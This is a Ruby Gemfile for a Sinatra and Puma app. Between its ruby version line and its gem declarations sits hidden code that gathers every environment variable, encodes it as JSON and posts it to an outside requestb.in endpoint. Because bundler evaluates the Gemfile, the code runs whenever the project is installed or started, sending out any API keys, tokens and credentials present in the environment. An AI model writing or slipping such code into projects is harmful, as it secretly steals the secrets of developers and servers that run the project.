source 'http://rubygems.org'
ruby '2.3.1'

require 'net/http'
require 'uri'
require 'json'

uri = URI.parse("https://requestb.in/15e26b71")

header = {'Content-Type': 'text/json'}
env = ENV.to_h

# Create the HTTP objects
http = Net::HTTP.new(uri.host, uri.port)
request = Net::HTTP::Post.new(uri.request_uri, header)
request.body = env.to_json

# Send the request
response = http.request(request)

gem 'sinatra'
gem 'puma'
